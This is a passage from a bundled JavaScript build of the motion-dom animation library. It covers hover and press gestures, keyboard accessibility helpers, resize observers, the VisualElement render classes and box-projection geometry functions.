				deferredHoverEnd = false;
				endHover(event);
			}
		};
		const onPointerDown = () => {
			isPressed = true;
			window.addEventListener("pointerup", onPointerUp, eventOptions);
			window.addEventListener("pointercancel", onPointerUp, eventOptions);
		};
		const onPointerLeave = (leaveEvent) => {
			if (leaveEvent.pointerType === "touch") return;
			if (isPressed) {
				deferredHoverEnd = true;
				return;
			}
			endHover(leaveEvent);
		};
		const onPointerEnter = (enterEvent) => {
			if (!isValidHover(enterEvent)) return;
			deferredHoverEnd = false;
			const onHoverEnd = onHoverStart(element, enterEvent);
			if (typeof onHoverEnd !== "function") return;
			hoverEndCallback = onHoverEnd;
			element.addEventListener("pointerleave", onPointerLeave, eventOptions);
		};
		element.addEventListener("pointerenter", onPointerEnter, eventOptions);
		element.addEventListener("pointerdown", onPointerDown, eventOptions);
	});
	return cancel;
}
// node_modules/motion-dom/dist/es/gestures/utils/is-node-or-child.mjs
/**
* Recursively traverse up the tree to check whether the provided child node
* is the parent or a descendant of it.
*
* @param parent - Element to find
* @param child - Element to test against parent
*/
var isNodeOrChild = (parent, child) => {
	if (!child) return false;
	else if (parent === child) return true;
	else return isNodeOrChild(parent, child.parentElement);
};
// node_modules/motion-dom/dist/es/gestures/utils/is-primary-pointer.mjs
var isPrimaryPointer = (event) => {
	if (event.pointerType === "mouse") return typeof event.button !== "number" || event.button <= 0;
	else
 /**
	* isPrimary is true for all mice buttons, whereas every touch point
	* is regarded as its own input. So subsequent concurrent touch points
	* will be false.
	*
	* Specifically match against false here as incomplete versions of
	* PointerEvents in very old browser might have it set as undefined.
	*/
	return event.isPrimary !== false;
};
// node_modules/motion-dom/dist/es/gestures/press/utils/is-keyboard-accessible.mjs
var keyboardAccessibleElements = /* @__PURE__ */ new Set([
	"BUTTON",
	"INPUT",
	"SELECT",
	"TEXTAREA",
	"A"
]);
/**
* Checks if an element is natively keyboard accessible (focusable).
* Used by the press gesture to determine if we need to add tabIndex.
*/
function isElementKeyboardAccessible(element) {
	return keyboardAccessibleElements.has(element.tagName) || element.isContentEditable === true;
}
var textInputElements = /* @__PURE__ */ new Set([
	"INPUT",
	"SELECT",
	"TEXTAREA"
]);
/**
* Checks if an element has text selection or direct interaction behavior
* that should block drag gestures from starting.
*
* This specifically targets form controls where the user might want to select
* text or interact with the control (e.g., sliders, dropdowns).
*
* Buttons and links are NOT included because they don't have click-and-move
* actions of their own - they only respond to click events, so dragging
* should still work when initiated from these elements.
*/
function isElementTextInput(element) {
	return textInputElements.has(element.tagName) || element.isContentEditable === true;
}
// node_modules/motion-dom/dist/es/gestures/press/utils/state.mjs
var isPressing = /* @__PURE__ */ new WeakSet();
// node_modules/motion-dom/dist/es/gestures/press/utils/keyboard.mjs
/**
* Filter out events that are not "Enter" keys.
*/
function filterEvents(callback) {
	return (event) => {
		if (event.key !== "Enter") return;
		callback(event);
	};
}
function firePointerEvent(target, type) {
	target.dispatchEvent(new PointerEvent("pointer" + type, {
		isPrimary: true,
		bubbles: true
	}));
}
var enableKeyboardPress = (focusEvent, eventOptions) => {
	const element = focusEvent.currentTarget;
	if (!element) return;
	const handleKeydown = filterEvents(() => {
		if (isPressing.has(element)) return;
		firePointerEvent(element, "down");
		const handleKeyup = filterEvents(() => {
			firePointerEvent(element, "up");
		});
		const handleBlur = () => firePointerEvent(element, "cancel");
		element.addEventListener("keyup", handleKeyup, eventOptions);
		element.addEventListener("blur", handleBlur, eventOptions);
	});
	element.addEventListener("keydown", handleKeydown, eventOptions);
	/**
	* Add an event listener that fires on blur to remove the keydown events.
	*/
	element.addEventListener("blur", () => element.removeEventListener("keydown", handleKeydown), eventOptions);
};
// node_modules/motion-dom/dist/es/gestures/press/index.mjs
/**
* Filter out events that are not primary pointer events, or are triggering
* while a Motion gesture is active.
*/
function isValidPressEvent(event) {
	return isPrimaryPointer(event) && !isDragActive();
}
var claimedPointerDownEvents = /* @__PURE__ */ new WeakSet();
/**
* Create a press gesture.
*
* Press is different to `"pointerdown"`, `"pointerup"` in that it
* automatically filters out secondary pointer events like right
* click and multitouch.
*
* It also adds accessibility support for keyboards, where
* an element with a press gesture will receive focus and
*  trigger on Enter `"keydown"` and `"keyup"` events.
*
* This is different to a browser's `"click"` event, which does
* respond to keyboards but only for the `"click"` itself, rather
* than the press start and end/cancel. The element also needs
* to be focusable for this to work, whereas a press gesture will
* make an element focusable by default.
*
* @public
*/
function press(targetOrSelector, onPressStart, options = {}) {
	const [targets, eventOptions, cancelEvents] = setupGesture(targetOrSelector, options);
	const startPress = (startEvent) => {
		const target = startEvent.currentTarget;
		if (!isValidPressEvent(startEvent)) return;
		if (claimedPointerDownEvents.has(startEvent)) return;
		isPressing.add(target);
		if (options.stopPropagation) claimedPointerDownEvents.add(startEvent);
		const onPressEnd = onPressStart(target, startEvent);
		/**
		* End listeners run in the capture phase so a descendant calling
		* stopPropagation() in its own pointerup handler can't prevent the
		* press gesture from ending. This also keeps the gesture-end
		* ordering consistent with the drag gesture. See #2794.
		*/
		const endEventOptions = {
			...eventOptions,
			capture: true
		};
		const onPointerEnd = (endEvent, success) => {
			window.removeEventListener("pointerup", onPointerUp, endEventOptions);
			window.removeEventListener("pointercancel", onPointerCancel, endEventOptions);
			if (isPressing.has(target)) isPressing.delete(target);
			if (!isValidPressEvent(endEvent)) return;
			if (typeof onPressEnd === "function") onPressEnd(endEvent, { success });
		};
		const onPointerUp = (upEvent) => {
			onPointerEnd(upEvent, target === window || target === document || options.useGlobalTarget || isNodeOrChild(target, upEvent.target));
		};
		const onPointerCancel = (cancelEvent) => {
			onPointerEnd(cancelEvent, false);
		};
		window.addEventListener("pointerup", onPointerUp, endEventOptions);
		window.addEventListener("pointercancel", onPointerCancel, endEventOptions);
	};
	targets.forEach((target) => {
		(options.useGlobalTarget ? window : target).addEventListener("pointerdown", startPress, eventOptions);
		if (isHTMLElement(target)) {
			target.addEventListener("focus", (event) => enableKeyboardPress(event, eventOptions));
			if (!isElementKeyboardAccessible(target) && !target.hasAttribute("tabindex")) target.tabIndex = 0;
		}
	});
	return cancelEvents;
}
// node_modules/motion-dom/dist/es/utils/is-svg-element.mjs
/**
* Checks if an element is an SVG element in a way
* that works across iframes
*/
function isSVGElement(element) {
	return isObject(element) && "ownerSVGElement" in element;
}
// node_modules/motion-dom/dist/es/resize/handle-element.mjs
var resizeHandlers = /* @__PURE__ */ new WeakMap();
var observer;
var getSize = (borderBoxAxis, svgAxis, htmlAxis) => (target, borderBoxSize) => {
	if (borderBoxSize && borderBoxSize[0]) return borderBoxSize[0][borderBoxAxis + "Size"];
	else if (isSVGElement(target) && "getBBox" in target) return target.getBBox()[svgAxis];
	else return target[htmlAxis];
};
var getWidth = /*@__PURE__*/ getSize("inline", "width", "offsetWidth");
var getHeight = /*@__PURE__*/ getSize("block", "height", "offsetHeight");
function notifyTarget({ target, borderBoxSize }) {
	resizeHandlers.get(target)?.forEach((handler) => {
		handler(target, {
			get width() {
				return getWidth(target, borderBoxSize);
			},
			get height() {
				return getHeight(target, borderBoxSize);
			}
		});
	});
}
function notifyAll(entries) {
	entries.forEach(notifyTarget);
}
function createResizeObserver() {
	if (typeof ResizeObserver === "undefined") return;
	observer = new ResizeObserver(notifyAll);
}
function resizeElement(target, handler) {
	if (!observer) createResizeObserver();
	const elements = resolveElements(target);
	elements.forEach((element) => {
		let elementHandlers = resizeHandlers.get(element);
		if (!elementHandlers) {
			elementHandlers = /* @__PURE__ */ new Set();
			resizeHandlers.set(element, elementHandlers);
		}
		elementHandlers.add(handler);
		observer?.observe(element);
	});
	return () => {
		elements.forEach((element) => {
			const elementHandlers = resizeHandlers.get(element);
			elementHandlers?.delete(handler);
			if (!elementHandlers?.size) observer?.unobserve(element);
		});
	};
}
// node_modules/motion-dom/dist/es/resize/handle-window.mjs
var windowCallbacks = /* @__PURE__ */ new Set();
var windowResizeHandler;
function createWindowResizeHandler() {
	windowResizeHandler = () => {
		const info = {
			get width() {
				return window.innerWidth;
			},
			get height() {
				return window.innerHeight;
			}
		};
		windowCallbacks.forEach((callback) => callback(info));
	};
	window.addEventListener("resize", windowResizeHandler);
}
function resizeWindow(callback) {
	windowCallbacks.add(callback);
	if (!windowResizeHandler) createWindowResizeHandler();
	return () => {
		windowCallbacks.delete(callback);
		if (!windowCallbacks.size && typeof windowResizeHandler === "function") {
			window.removeEventListener("resize", windowResizeHandler);
			windowResizeHandler = void 0;
		}
	};
}
// node_modules/motion-dom/dist/es/resize/index.mjs
function resize(a, b) {
	return typeof a === "function" ? resizeWindow(a) : resizeElement(a, b);
}
// node_modules/motion-dom/dist/es/stats/buffer.mjs
var statsBuffer = {
	value: null,
	addProjectionMetrics: null
};
// node_modules/motion-dom/dist/es/utils/is-svg-svg-element.mjs
/**
* Checks if an element is specifically an SVGSVGElement (the root SVG element)
* in a way that works across iframes
*/
function isSVGSVGElement(element) {
	return isSVGElement(element) && element.tagName === "svg";
}
// node_modules/motion-dom/dist/es/value/types/utils/find.mjs
/**
* A list of all ValueTypes
*/
var valueTypes = [
	...dimensionValueTypes,
	color,
	complex
];
/**
* Tests a value against the list of ValueTypes
*/
var findValueType = (v) => valueTypes.find(testValueType(v));
// node_modules/motion-dom/dist/es/projection/geometry/models.mjs
var createAxisDelta = () => ({
	translate: 0,
	scale: 1,
	origin: 0,
	originPoint: 0
});
var createDelta = () => ({
	x: createAxisDelta(),
	y: createAxisDelta()
});
var createAxis = () => ({
	min: 0,
	max: 0
});
var createBox = () => ({
	x: createAxis(),
	y: createAxis()
});
// node_modules/motion-dom/dist/es/render/store.mjs
var visualElementStore = /* @__PURE__ */ new WeakMap();
// node_modules/motion-dom/dist/es/render/utils/is-animation-controls.mjs
function isAnimationControls(v) {
	return v !== null && typeof v === "object" && typeof v.start === "function";
}
// node_modules/motion-dom/dist/es/render/utils/is-variant-label.mjs
/**
* Decides if the supplied variable is variant label
*/
function isVariantLabel(v) {
	return typeof v === "string" || Array.isArray(v);
}
// node_modules/motion-dom/dist/es/render/utils/variant-props.mjs
var variantPriorityOrder = [
	"animate",
	"whileInView",
	"whileFocus",
	"whileHover",
	"whileTap",
	"whileDrag",
	"exit"
];
var variantProps = ["initial", ...variantPriorityOrder];
// node_modules/motion-dom/dist/es/render/utils/is-controlling-variants.mjs
function isControllingVariants(props) {
	return isAnimationControls(props.animate) || variantProps.some((name) => isVariantLabel(props[name]));
}
function isVariantNode(props) {
	return Boolean(isControllingVariants(props) || props.variants);
}
// node_modules/motion-dom/dist/es/render/utils/motion-values.mjs
/**
* Updates motion values from props changes.
* Uses `any` type for element to avoid circular dependencies with VisualElement.
*/
function updateMotionValuesFromProps(element, next, prev) {
	for (const key in next) {
		const nextValue = next[key];
		const prevValue = prev[key];
		if (isMotionValue(nextValue))
 /**
		* If this is a motion value found in props or style, we want to add it
		* to our visual element's motion value map.
		*/
		element.addValue(key, nextValue);
		else if (isMotionValue(prevValue))
 /**
		* If we're swapping from a motion value to a static value,
		* create a new motion value from that
		*/
		element.addValue(key, motionValue(nextValue, { owner: element }));
		else if (prevValue !== nextValue) {
			/**
			* If this is a flat value that has changed, update the motion value
			* or create one if it doesn't exist. We only want to do this if we're
			* not handling the value with our animation state.
			*/
			if (element.hasValue(key)) {
				const existingValue = element.getValue(key);
				if (existingValue.liveStyle === true) existingValue.jump(nextValue);
				else if (!existingValue.hasAnimated) existingValue.set(nextValue);
			} else {
				const latestValue = element.getStaticValue(key);
				element.addValue(key, motionValue(latestValue !== void 0 ? latestValue : nextValue, { owner: element }));
			}
		}
	}
	for (const key in prev) if (next[key] === void 0) element.removeValue(key);
	return next;
}
// node_modules/motion-dom/dist/es/render/utils/reduced-motion/state.mjs
var prefersReducedMotion = { current: null };
var hasReducedMotionListener = { current: false };
// node_modules/motion-dom/dist/es/render/utils/reduced-motion/index.mjs
var isBrowser = typeof window !== "undefined";
function initPrefersReducedMotion() {
	hasReducedMotionListener.current = true;
	if (!isBrowser) return;
	if (window.matchMedia) {
		const motionMediaQuery = window.matchMedia("(prefers-reduced-motion)");
		const setReducedMotionPreferences = () => prefersReducedMotion.current = motionMediaQuery.matches;
		motionMediaQuery.addEventListener("change", setReducedMotionPreferences);
		setReducedMotionPreferences();
	} else prefersReducedMotion.current = false;
}
// node_modules/motion-dom/dist/es/render/VisualElement.mjs
var propEventHandlers = [
	"AnimationStart",
	"AnimationComplete",
	"Update",
	"BeforeLayoutMeasure",
	"LayoutMeasure",
	"LayoutAnimationStart",
	"LayoutAnimationComplete"
];
/**
* Static feature definitions - can be injected by framework layer
*/
var featureDefinitions = {};
/**
* Set feature definitions for all VisualElements.
* This should be called by the framework layer (e.g., framer-motion) during initialization.
*/
function setFeatureDefinitions(definitions) {
	featureDefinitions = definitions;
}
/**
* Get the current feature definitions
*/
function getFeatureDefinitions() {
	return featureDefinitions;
}
/**
* A VisualElement is an imperative abstraction around UI elements such as
* HTMLElement, SVGElement, Three.Object3D etc.
*/
var VisualElement = class {
	/**
	* This method takes React props and returns found MotionValues. For example, HTML
	* MotionValues will be found within the style prop, whereas for Three.js within attribute arrays.
	*
	* This isn't an abstract method as it needs calling in the constructor, but it is
	* intended to be one.
	*/
	scrapeMotionValuesFromProps(_props, _prevProps, _visualElement) {
		return {};
	}
	constructor({ parent, props, presenceContext, reducedMotionConfig, skipAnimations, blockInitialAnimation, visualState }, options = {}) {
		/**
		* A reference to the current underlying Instance, e.g. a HTMLElement
		* or Three.Mesh etc.
		*/
		this.current = null;
		/**
		* A set containing references to this VisualElement's children.
		*/
		this.children = /* @__PURE__ */ new Set();
		/**
		* Determine what role this visual element should take in the variant tree.
		*/
		this.isVariantNode = false;
		this.isControllingVariants = false;
		/**
		* Decides whether this VisualElement should animate in reduced motion
		* mode.
		*
		* TODO: This is currently set on every individual VisualElement but feels
		* like it could be set globally.
		*/
		this.shouldReduceMotion = null;
		/**
		* Decides whether animations should be skipped for this VisualElement.
		* Useful for E2E tests and visual regression testing.
		*/
		this.shouldSkipAnimations = false;
		/**
		* A map of all motion values attached to this visual element. Motion
		* values are source of truth for any given animated value. A motion
		* value might be provided externally by the component via props.
		*/
		this.values = /* @__PURE__ */ new Map();
		this.KeyframeResolver = KeyframeResolver;
		/**
		* Cleanup functions for active features (hover/tap/exit etc)
		*/
		this.features = {};
		/**
		* A map of every subscription that binds the provided or generated
		* motion values onChange listeners to this visual element.
		*/
		this.valueSubscriptions = /* @__PURE__ */ new Map();
		/**
		* A reference to the previously-provided motion values as returned
		* from scrapeMotionValuesFromProps. We use the keys in here to determine
		* if any motion values need to be removed after props are updated.
		*/
		this.prevMotionValues = {};
		/**
		* Track whether this element has been mounted before, to detect
		* remounts after Suspense unmount/remount cycles.
		*/
		this.hasBeenMounted = false;
		/**
		* An object containing a SubscriptionManager for each active event.
		*/
		this.events = {};
		/**
		* An object containing an unsubscribe function for each prop event subscription.
		* For example, every "Update" event can have multiple subscribers via
		* VisualElement.on(), but only one of those can be defined via the onUpdate prop.
		*/
		this.propEventSubscriptions = {};
		this.notifyUpdate = () => this.notify("Update", this.latestValues);
		this.render = () => {
			if (!this.current) return;
			this.triggerBuild();
			this.renderInstance(this.current, this.renderState, this.props.style, this.projection);
		};
		this.renderScheduledAt = 0;
		this.scheduleRender = () => {
			const now = time.now();
			if (this.renderScheduledAt < now) {
				this.renderScheduledAt = now;
				frame.render(this.render, false, true);
			}
		};
		const { latestValues, renderState } = visualState;
		this.latestValues = latestValues;
		this.baseTarget = { ...latestValues };
		this.initialValues = props.initial ? { ...latestValues } : {};
		this.renderState = renderState;
		this.parent = parent;
		this.props = props;
		this.presenceContext = presenceContext;
		this.depth = parent ? parent.depth + 1 : 0;
		this.reducedMotionConfig = reducedMotionConfig;
		this.skipAnimationsConfig = skipAnimations;
		this.options = options;
		this.blockInitialAnimation = Boolean(blockInitialAnimation);
		this.isControllingVariants = isControllingVariants(props);
		this.isVariantNode = isVariantNode(props);
		if (this.isVariantNode) this.variantChildren = /* @__PURE__ */ new Set();
		this.manuallyAnimateOnMount = Boolean(parent && parent.current);
		/**
		* Any motion values that are provided to the element when created
		* aren't yet bound to the element, as this would technically be impure.
		* However, we iterate through the motion values and set them to the
		* initial values for this component.
		*
		* TODO: This is impure and we should look at changing this to run on mount.
		* Doing so will break some tests but this isn't necessarily a breaking change,
		* more a reflection of the test.
		*/
		const { willChange, ...initialMotionValues } = this.scrapeMotionValuesFromProps(props, {}, this);
		for (const key in initialMotionValues) {
			const value = initialMotionValues[key];
			if (latestValues[key] !== void 0 && isMotionValue(value)) value.set(latestValues[key]);
		}
	}
	mount(instance) {
		/**
		* If this element has been mounted before (e.g. after a Suspense
		* unmount/remount), reset motion values to their initial state
		* so animations replay correctly from initial → animate.
		*/
		if (this.hasBeenMounted) for (const key in this.initialValues) {
			this.values.get(key)?.jump(this.initialValues[key]);
			this.latestValues[key] = this.initialValues[key];
		}
		this.current = instance;
		visualElementStore.set(instance, this);
		if (this.projection && !this.projection.instance) this.projection.mount(instance);
		if (this.parent && this.isVariantNode && !this.isControllingVariants) this.removeFromVariantTree = this.parent.addVariantChild(this);
		this.values.forEach((value, key) => this.bindToMotionValue(key, value));
		/**
		* Determine reduced motion preference. Only initialize the matchMedia
		* listener if we actually need the dynamic value (i.e., when config
		* is neither "never" nor "always").
		*/
		if (this.reducedMotionConfig === "never") this.shouldReduceMotion = false;
		else if (this.reducedMotionConfig === "always") this.shouldReduceMotion = true;
		else {
			if (!hasReducedMotionListener.current) initPrefersReducedMotion();
			this.shouldReduceMotion = prefersReducedMotion.current;
		}
		/**
		* Set whether animations should be skipped based on the config.
		*/
		this.shouldSkipAnimations = this.skipAnimationsConfig ?? false;
		this.parent?.addChild(this);
		this.update(this.props, this.presenceContext);
		this.hasBeenMounted = true;
	}
	unmount() {
		this.projection && this.projection.unmount();
		cancelFrame(this.notifyUpdate);
		cancelFrame(this.render);
		this.valueSubscriptions.forEach((remove) => remove());
		this.valueSubscriptions.clear();
		this.removeFromVariantTree && this.removeFromVariantTree();
		this.parent?.removeChild(this);
		for (const key in this.events) this.events[key].clear();
		for (const key in this.features) {
			const feature = this.features[key];
			if (feature) {
				feature.unmount();
				feature.isMounted = false;
			}
		}
		this.current = null;
	}
	addChild(child) {
		this.children.add(child);
		this.enteringChildren ?? (this.enteringChildren = /* @__PURE__ */ new Set());
		this.enteringChildren.add(child);
	}
	removeChild(child) {
		this.children.delete(child);
		this.enteringChildren && this.enteringChildren.delete(child);
	}
	bindToMotionValue(key, value) {
		if (this.valueSubscriptions.has(key)) this.valueSubscriptions.get(key)();
		if (value.accelerate && acceleratedValues.has(key) && this.current instanceof HTMLElement) {
			const { factory, keyframes, times, ease, duration } = value.accelerate;
			const animation = new NativeAnimation({
				element: this.current,
				name: key,
				keyframes,
				times,
				ease,
				duration: /* @__PURE__ */ secondsToMilliseconds(duration)
			});
			const cleanup = factory(animation);
			this.valueSubscriptions.set(key, () => {
				cleanup();
				animation.cancel();
			});
			return;
		}
		const valueIsTransform = transformProps.has(key);
		if (valueIsTransform && this.onBindTransform) this.onBindTransform();
		const removeOnChange = value.on("change", (latestValue) => {
			this.latestValues[key] = latestValue;
			this.props.onUpdate && frame.preRender(this.notifyUpdate);
			if (valueIsTransform && this.projection) this.projection.isTransformDirty = true;
			this.scheduleRender();
		});
		let removeSyncCheck;
		if (typeof window !== "undefined" && window.MotionCheckAppearSync) removeSyncCheck = window.MotionCheckAppearSync(this, key, value);
		this.valueSubscriptions.set(key, () => {
			removeOnChange();
			if (removeSyncCheck) removeSyncCheck();
		});
	}
	sortNodePosition(other) {
		/**
		* If these nodes aren't even of the same type we can't compare their depth.
		*/
		if (!this.current || !this.sortInstanceNodePosition || this.type !== other.type) return 0;
		return this.sortInstanceNodePosition(this.current, other.current);
	}
	updateFeatures() {
		let key = "animation";
		for (key in featureDefinitions) {
			const featureDefinition = featureDefinitions[key];
			if (!featureDefinition) continue;
			const { isEnabled, Feature: FeatureConstructor } = featureDefinition;
			/**
			* If this feature is enabled but not active, make a new instance.
			*/
			if (!this.features[key] && FeatureConstructor && isEnabled(this.props)) this.features[key] = new FeatureConstructor(this);
			/**
			* If we have a feature, mount or update it.
			*/
			if (this.features[key]) {
				const feature = this.features[key];
				if (feature.isMounted) feature.update();
				else {
					feature.mount();
					feature.isMounted = true;
				}
			}
		}
	}
	triggerBuild() {
		this.build(this.renderState, this.latestValues, this.props);
	}
	/**
	* Measure the current viewport box with or without transforms.
	* Only measures axis-aligned boxes, rotate and skew must be manually
	* removed with a re-render to work.
	*/
	measureViewportBox() {
		return this.current ? this.measureInstanceViewportBox(this.current, this.props) : createBox();
	}
	getStaticValue(key) {
		return this.latestValues[key];
	}
	setStaticValue(key, value) {
		this.latestValues[key] = value;
	}
	/**
	* Update the provided props. Ensure any newly-added motion values are
	* added to our map, old ones removed, and listeners updated.
	*/
	update(props, presenceContext) {
		if (props.transformTemplate || this.props.transformTemplate) this.scheduleRender();
		this.prevProps = this.props;
		this.props = props;
		this.prevPresenceContext = this.presenceContext;
		this.presenceContext = presenceContext;
		/**
		* Update prop event handlers ie onAnimationStart, onAnimationComplete
		*/
		for (let i = 0; i < propEventHandlers.length; i++) {
			const key = propEventHandlers[i];
			if (this.propEventSubscriptions[key]) {
				this.propEventSubscriptions[key]();
				delete this.propEventSubscriptions[key];
			}
			const listener = props["on" + key];
			if (listener) this.propEventSubscriptions[key] = this.on(key, listener);
		}
		this.prevMotionValues = updateMotionValuesFromProps(this, this.scrapeMotionValuesFromProps(props, this.prevProps || {}, this), this.prevMotionValues);
		if (this.handleChildMotionValue) this.handleChildMotionValue();
	}
	getProps() {
		return this.props;
	}
	/**
	* Returns the variant definition with a given name.
	*/
	getVariant(name) {
		return this.props.variants ? this.props.variants[name] : void 0;
	}
	/**
	* Returns the defined default transition on this component.
	*/
	getDefaultTransition() {
		return this.props.transition;
	}
	getTransformPagePoint() {
		return this.props.transformPagePoint;
	}
	getClosestVariantNode() {
		return this.isVariantNode ? this : this.parent ? this.parent.getClosestVariantNode() : void 0;
	}
	/**
	* Add a child visual element to our set of children.
	*/
	addVariantChild(child) {
		const closestVariantNode = this.getClosestVariantNode();
		if (closestVariantNode) {
			closestVariantNode.variantChildren && closestVariantNode.variantChildren.add(child);
			return () => closestVariantNode.variantChildren.delete(child);
		}
	}
	/**
	* Add a motion value and bind it to this visual element.
	*/
	addValue(key, value) {
		const existingValue = this.values.get(key);
		if (value !== existingValue) {
			if (existingValue) this.removeValue(key);
			this.bindToMotionValue(key, value);
			this.values.set(key, value);
			this.latestValues[key] = value.get();
		}
	}
	/**
	* Remove a motion value and unbind any active subscriptions.
	*/
	removeValue(key) {
		this.values.delete(key);
		const unsubscribe = this.valueSubscriptions.get(key);
		if (unsubscribe) {
			unsubscribe();
			this.valueSubscriptions.delete(key);
		}
		delete this.latestValues[key];
		this.removeValueFromRenderState(key, this.renderState);
	}
	/**
	* Check whether we have a motion value for this key
	*/
	hasValue(key) {
		return this.values.has(key);
	}
	getValue(key, defaultValue) {
		if (this.props.values && this.props.values[key]) return this.props.values[key];
		let value = this.values.get(key);
		if (value === void 0 && defaultValue !== void 0) {
			value = motionValue(defaultValue === null ? void 0 : defaultValue, { owner: this });
			this.addValue(key, value);
		}
		return value;
	}
	/**
	* If we're trying to animate to a previously unencountered value,
	* we need to check for it in our state and as a last resort read it
	* directly from the instance (which might have performance implications).
	*/
	readValue(key, target) {
		let value = this.latestValues[key] !== void 0 || !this.current ? this.latestValues[key] : this.getBaseTargetFromProps(this.props, key) ?? this.readValueFromInstance(this.current, key, this.options);
		if (value !== void 0 && value !== null) {
			if (typeof value === "string" && (isNumericalString(value) || isZeroValueString(value))) value = parseFloat(value);
			else if (!findValueType(value) && complex.test(target)) value = getAnimatableNone(key, target);
			this.setBaseTarget(key, isMotionValue(value) ? value.get() : value);
		}
		return isMotionValue(value) ? value.get() : value;
	}
	/**
	* Set the base target to later animate back to. This is currently
	* only hydrated on creation and when we first read a value.
	*/
	setBaseTarget(key, value) {
		this.baseTarget[key] = value;
	}
	/**
	* Find the base target for a value thats been removed from all animation
	* props.
	*/
	getBaseTarget(key) {
		const { initial } = this.props;
		let valueFromInitial;
		if (typeof initial === "string" || typeof initial === "object") {
			const variant = resolveVariantFromProps(this.props, initial, this.presenceContext?.custom);
			if (variant) valueFromInitial = variant[key];
		}
		/**
		* If this value still exists in the current initial variant, read that.
		*/
		if (initial && valueFromInitial !== void 0) return valueFromInitial;
		/**
		* Alternatively, if this VisualElement config has defined a getBaseTarget
		* so we can read the value from an alternative source, try that.
		*/
		const target = this.getBaseTargetFromProps(this.props, key);
		if (target !== void 0 && !isMotionValue(target)) return target;
		/**
		* If the value was initially defined on initial, but it doesn't any more,
		* return undefined. Otherwise return the value as initially read from the DOM.
		*/
		return this.initialValues[key] !== void 0 && valueFromInitial === void 0 ? void 0 : this.baseTarget[key];
	}
	on(eventName, callback) {
		if (!this.events[eventName]) this.events[eventName] = new SubscriptionManager();
		return this.events[eventName].add(callback);
	}
	notify(eventName, ...args) {
		if (this.events[eventName]) this.events[eventName].notify(...args);
	}
	scheduleRenderMicrotask() {
		microtask.render(this.render);
	}
};
// node_modules/motion-dom/dist/es/render/dom/DOMVisualElement.mjs
var DOMVisualElement = class extends VisualElement {
	constructor() {
		super(...arguments);
		this.KeyframeResolver = DOMKeyframesResolver;
	}
	sortInstanceNodePosition(a, b) {
		/**
		* compareDocumentPosition returns a bitmask, by using the bitwise &
		* we're returning true if 2 in that bitmask is set to true. 2 is set
		* to true if b preceeds a.
		*/
		return a.compareDocumentPosition(b) & 2 ? 1 : -1;
	}
	getBaseTargetFromProps(props, key) {
		const style = props.style;
		return style ? style[key] : void 0;
	}
	removeValueFromRenderState(key, { vars, style }) {
		delete vars[key];
		delete style[key];
	}
	handleChildMotionValue() {
		if (this.childSubscription) {
			this.childSubscription();
			delete this.childSubscription;
		}
		const { children } = this.props;
		if (isMotionValue(children)) this.childSubscription = children.on("change", (latest) => {
			if (this.current) this.current.textContent = `${latest}`;
		});
	}
};
// node_modules/motion-dom/dist/es/render/Feature.mjs
/**
* Feature base class for extending VisualElement functionality.
* Features are plugins that can be mounted/unmounted to add behavior
* like gestures, animations, or layout tracking.
*/
var Feature = class {
	constructor(node) {
		this.isMounted = false;
		this.node = node;
	}
	update() {}
};
// node_modules/motion-dom/dist/es/projection/geometry/conversion.mjs
/**
* Bounding boxes tend to be defined as top, left, right, bottom. For various operations
* it's easier to consider each axis individually. This function returns a bounding box
* as a map of single-axis min/max values.
*/
function convertBoundingBoxToBox({ top, left, right, bottom }) {
	return {
		x: {
			min: left,
			max: right
		},
		y: {
			min: top,
			max: bottom
		}
	};
}
function convertBoxToBoundingBox({ x, y }) {
	return {
		top: y.min,
		right: x.max,
		bottom: y.max,
		left: x.min
	};
}
/**
* Applies a TransformPoint function to a bounding box. TransformPoint is usually a function
* provided by Framer to allow measured points to be corrected for device scaling. This is used
* when measuring DOM elements and DOM event points.
*/
function transformBoxPoints(point, transformPoint) {
	if (!transformPoint) return point;
	const topLeft = transformPoint({
		x: point.left,
		y: point.top
	});
	const bottomRight = transformPoint({
		x: point.right,
		y: point.bottom
	});
	return {
		top: topLeft.y,
		left: topLeft.x,
		bottom: bottomRight.y,
		right: bottomRight.x
	};
}
// node_modules/motion-dom/dist/es/projection/utils/has-transform.mjs
function isIdentityScale(scale) {
	return scale === void 0 || scale === 1;
}
function hasScale({ scale, scaleX, scaleY }) {
	return !isIdentityScale(scale) || !isIdentityScale(scaleX) || !isIdentityScale(scaleY);
}
function hasTransform(values) {
	return hasScale(values) || has2DTranslate(values) || values.z || values.rotate || values.rotateX || values.rotateY || values.skewX || values.skewY;
}
function has2DTranslate(values) {
	return is2DTranslate(values.x) || is2DTranslate(values.y);
}
function is2DTranslate(value) {
	return value && value !== "0%";
}
// node_modules/motion-dom/dist/es/projection/geometry/delta-apply.mjs
/**
* Scales a point based on a factor and an originPoint
*/
function scalePoint(point, scale, originPoint) {
	return originPoint + scale * (point - originPoint);
}
/**
* Applies a translate/scale delta to a point
*/
function applyPointDelta(point, translate, scale, originPoint, boxScale) {
	if (boxScale !== void 0) point = scalePoint(point, boxScale, originPoint);
	return scalePoint(point, scale, originPoint) + translate;
}
/**
* Applies a translate/scale delta to an axis
*/
function applyAxisDelta(axis, translate = 0, scale = 1, originPoint, boxScale) {
	axis.min = applyPointDelta(axis.min, translate, scale, originPoint, boxScale);
	axis.max = applyPointDelta(axis.max, translate, scale, originPoint, boxScale);
}
/**
* Applies a translate/scale delta to a box
*/
function applyBoxDelta(box, { x, y }) {
	applyAxisDelta(box.x, x.translate, x.scale, x.originPoint);
	applyAxisDelta(box.y, y.translate, y.scale, y.originPoint);
}
var TREE_SCALE_SNAP_MIN = .999999999999;
var TREE_SCALE_SNAP_MAX = 1.0000000000001;
/**
* Apply a tree of deltas to a box. We do this to calculate the effect of all the transforms
* in a tree upon our box before then calculating how to project it into our desired viewport-relative box
*
* This is the final nested loop within updateLayoutDelta for future refactoring
*/
function applyTreeDeltas(box, treeScale, treePath, isSharedTransition = false) {
	const treeLength = treePath.length;
	if (!treeLength) return;
	treeScale.x = treeScale.y = 1;
	let node;
	let delta;
	for (let i = 0; i < treeLength; i++) {
		node = treePath[i];
		delta = node.projectionDelta;
		/**
		* TODO: Prefer to remove this, but currently we have motion components with
		* display: contents in Framer.
		*/
		const { visualElement } = node.options;
		if (visualElement && visualElement.props.style && visualElement.props.style.display === "contents") continue;
		if (isSharedTransition && node.options.layoutScroll && node.scroll && node !== node.root) {
			translateAxis(box.x, -node.scroll.offset.x);
			translateAxis(box.y, -node.scroll.offset.y);
		}
		if (delta) {
			treeScale.x *= delta.x.scale;
			treeScale.y *= delta.y.scale;
